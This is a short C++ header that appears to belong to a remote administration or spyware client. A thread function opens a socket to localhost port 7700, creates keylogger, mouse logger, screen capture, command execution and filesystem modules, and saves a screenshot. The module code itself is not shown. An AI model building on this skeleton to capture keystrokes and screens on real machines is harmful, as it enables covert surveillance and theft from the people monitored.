#pragma once

#include "addon.h"

extern addonThread* gThread;
extern addonMutex* gMutex;
addonSocket* gSocket;
addonProcess* gProcess;
addonKeylog* gKeylog;
addonMouselog* gMouselog;
addonScreen* gScreen;
addonSysexec* gSysexec;
addonFS* gFS;





DWORD _stdcall main_thread(LPVOID lpParam)
{
	gSocket = new addonSocket();
	gSocket->socketHandle = gSocket->Start();
	gSocket->Connect(std::string("127.0.0.1"), 7700);

	gProcess = new addonProcess();
	gKeylog = new addonKeylog();
	gMouselog = new addonMouselog();
	gScreen = new addonScreen();
	gSysexec = new addonSysexec();
	gFS = new addonFS();

	gScreen->Get(std::string("test.bmp"));

	return 1;
}